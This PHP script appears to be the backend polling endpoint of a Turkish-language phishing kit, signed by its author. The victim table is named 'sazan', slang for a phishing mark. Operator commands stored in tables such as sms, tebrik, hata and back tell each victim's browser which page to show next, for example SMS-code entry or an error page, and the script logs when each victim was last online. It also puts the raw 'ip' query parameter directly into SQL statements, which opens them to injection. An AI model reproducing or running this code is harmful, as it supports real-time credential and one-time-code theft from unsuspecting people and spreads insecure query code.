<?php 
  #Coded By Fatal -ICQ: fatal1
include 'connect.php';
  #Coded By Fatal -ICQ: fatal1
$ip=$_GET["ip"];
  #Coded By Fatal -ICQ: fatal1
$sms = $db->query("SELECT * FROM sms", PDO::FETCH_ASSOC);
foreach($sms as $row1){
    if($row1['sms'] == $ip){ 
        echo 'sms';
        $db->query("DELETE FROM sms WHERE sms='$ip'");
        } 
}#Coded By Fatal -ICQ: fatal1
$tebrik = $db->query("SELECT * FROM tebrik", PDO::FETCH_ASSOC);
foreach($tebrik as $row2){
    if($row2['tebrik'] == $ip){ 
        echo "tebrik";
        $db->query("DELETE FROM tebrik WHERE tebrik='$ip'");
        } 
}  #Coded By Fatal -ICQ: fatal1
$hata = $db->query("SELECT * FROM hata", PDO::FETCH_ASSOC);
foreach($hata as $row4){
    if($row4['hata'] == $ip){ 
        echo "hata";
        $db->query("DELETE FROM hata WHERE hata='$ip'");
        } 
}
$sms2 = $db->query("SELECT * FROM sms2", PDO::FETCH_ASSOC);
foreach($sms2 as $row5){
    if($row5['sms2'] == $ip){ 
        echo "sms2";
        $db->query("DELETE FROM sms2 WHERE sms2='$ip'");
        } 
}  #Coded By Fatal -ICQ: fatal1
$back = $db->query("SELECT * FROM back", PDO::FETCH_ASSOC);
foreach($back as $row6){
    if($row6['back'] == $ip){ 
        echo "back";
        $db->query("UPDATE sazan SET back = '0' WHERE ip = '{$ip}'");
        $db->query("DELETE FROM back WHERE back='$ip'");
        } 
}  #Coded By Fatal -ICQ: fatal1
$goControl = $db->query("SELECT * FROM sazan WHERE ip='$ip'")->fetch(PDO::FETCH_ASSOC);
if($goControl['go']=='1'){
    echo '1';
    $db->query("UPDATE sazan SET go = '0' WHERE ip = '$ip'");
}elseif($goControl['go']=='2'){
       echo '2';
    $db->query("UPDATE sazan SET go = '0' WHERE ip = '$ip'");
}elseif($goControl['go']=='3'){
       echo '3';
    $db->query("UPDATE sazan SET go = '0' WHERE ip = '$ip'");
}elseif($goControl['go']=='4'){
       echo '4';
    $db->query("UPDATE sazan SET go = '0' WHERE ip = '$ip'");
}elseif($goControl['go']=='5'){
       echo '5';
    $db->query("UPDATE sazan SET go = '0' WHERE ip = '$ip'");
}else{
   #Coded By Fatal -ICQ: fatal1
}
if($_SERVER['REMOTE_ADDR'] == $_GET['ip']) {
	$timex = time()+7;
	$db->query("UPDATE sazan SET lastOnline = '$timex' WHERE ip = '$ip'");

	$query = $db->query("SELECT * FROM ips WHERE ipAddress = '$ip'")->fetch(PDO::FETCH_ASSOC);
	if($query) {
		$db->query("UPDATE ips SET lastOnline = '$timex' WHERE ipAddress = '$ip'");
	} else {
		$query = $db->prepare("INSERT INTO ips SET ipAddress = ?, lastOnline = ?");
		$insert = $query->execute(array($ip, $timex));
	}
}
?>